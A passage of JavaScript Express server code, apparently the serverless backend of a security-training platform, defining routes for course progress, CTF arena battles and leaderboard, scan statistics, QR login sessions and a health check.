    skills: ['Reverse Engineering', 'Malware Analysis', 'Ghidra', 'PE Analysis', 'Android RE', 'Binary Analysis']
  }
];

app.get('/api/courses', (req, res) => {
  const userId = 1;
  const progress = db.userProgress.get(userId) || {};
  
  const coursesWithProgress = COURSES_DATA.map(course => {
    const courseProgress = progress[course.id] || { completedLessons: [], started: false };
    const totalLessons = course.lessons.length;
    const completedLessons = courseProgress.completedLessons?.length || 0;
    
    return {
      ...course,
      progress: Math.round((completedLessons / totalLessons) * 100),
      completedLessons,
      totalLessons,
      started: courseProgress.started || completedLessons > 0
    };
  });
  
  res.json(coursesWithProgress);
});

app.get('/api/courses/:id', (req, res) => {
  const course = COURSES_DATA.find(c => c.id === parseInt(req.params.id));
  if (!course) return res.status(404).json({ message: 'Course not found' });
  
  const userId = 1;
  const progress = db.userProgress.get(userId) || {};
  const courseProgress = progress[course.id] || { completedLessons: [] };
  
  res.json({
    ...course,
    lessons: course.lessons.map(l => ({
      ...l,
      completed: courseProgress.completedLessons?.includes(l.id) || false
    }))
  });
});

app.post('/api/courses/:id/progress', (req, res) => {
  const courseId = parseInt(req.params.id);
  const { lessonId, completed } = req.body;
  const userId = 1;
  
  if (!db.userProgress.has(userId)) {
    db.userProgress.set(userId, {});
  }
  
  const userProgress = db.userProgress.get(userId);
  if (!userProgress[courseId]) {
    userProgress[courseId] = { completedLessons: [], started: true };
  }
  
  if (completed && !userProgress[courseId].completedLessons.includes(lessonId)) {
    userProgress[courseId].completedLessons.push(lessonId);
  } else if (!completed) {
    userProgress[courseId].completedLessons = userProgress[courseId].completedLessons.filter(id => id !== lessonId);
  }
  
  res.json({ success: true, progress: userProgress[courseId] });
});

// ============ ARENA/CTF API ============
app.get('/api/arena/battles', (req, res) => {
  const battles = db.arenaBattles.slice(0, 10).map(b => ({
    ...b,
    player1: db.users.get(b.player1Id),
    player2: db.users.get(b.player2Id)
  }));
  res.json(battles);
});

app.get('/api/arena/leaderboard', (req, res) => {
  const sorted = Array.from(db.users.values())
    .sort((a, b) => (b.rating || 0) - (a.rating || 0))
    .slice(0, 20)
    .map((u, idx) => ({
      rank: idx + 1,
      name: u.username,
      rating: u.rating || 1500,
      wins: u.wins || 0,
      losses: u.losses || 0,
      avatar: ['🏆', '🥈', '🥉', '🛡️', '⚔️'][idx % 5]
    }));
  res.json(sorted);
});

app.post('/api/arena/create', (req, res) => {
  const { mode } = req.body;
  const battle = {
    id: db.nextIds.battle++,
    player1Id: 1,
    player2Id: null,
    mode: mode || 'ranked',
    status: 'waiting',
    createdAt: new Date(),
    timeLeft: '15:00',
    spectators: 0
  };
  db.arenaBattles.unshift(battle);
  res.json(battle);
});

app.post('/api/arena/join/:id', (req, res) => {
  const battle = db.arenaBattles.find(b => b.id === parseInt(req.params.id));
  if (!battle) return res.status(404).json({ message: 'Battle not found' });
  if (battle.player2Id) return res.status(400).json({ message: 'Battle full' });
  
  battle.player2Id = 1;
  battle.status = 'active';
  res.json(battle);
});

// ============ STATS ============
app.get('/api/stats', (req, res) => {
  const userScans = db.scans.filter(s => s.userId === 1);
  const totalScans = userScans.length;
  const safeScans = userScans.filter(s => s.isSafe).length;
  const vulnerabilitiesByType = {};
  const scansOverTimeMap = {};
  
  userScans.forEach(scan => {
    scan.result?.vulnerabilities?.forEach(v => {
      vulnerabilitiesByType[v.type] = (vulnerabilitiesByType[v.type] || 0) + 1;
    });
    
    const date = scan.createdAt.toISOString().split('T')[0];
    scansOverTimeMap[date] = (scansOverTimeMap[date] || 0) + 1;
  });
  
  const scansOverTime = Object.entries(scansOverTimeMap)
    .map(([date, count]) => ({ date, count }))
    .sort((a, b) => a.date.localeCompare(b.date));
  
  res.json({ totalScans, safeScans, vulnerabilitiesByType, scansOverTime });
});

// ============ QR AUTH ============
app.post('/api/qr/generate', (req, res) => {
  const sessionId = Math.random().toString(36).substring(2, 15);
  const baseUrl = process.env.URL || 'https://secops-global.netlify.app';
  res.json({
    sessionId,
    expiresAt: Date.now() + 300000,
    authUrl: `${baseUrl}/auth/qr?sessionId=${sessionId}`,
    qrData: `${baseUrl}/auth/qr?sessionId=${sessionId}`
  });
});

// ============ HEALTH ============
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString(),
    version: '2.0.0',
    features: ['ai-analysis', 'real-cve', 'courses', 'arena']
  });
});

// Error handler
app.use((err, _req, res, _next) => {
  console.error('Error:', err);
  res.status(500).json({ message: err.message || 'Internal Server Error' });
});

export const handler = serverless(app, {
  binary: ['image/*', 'application/pdf']
});
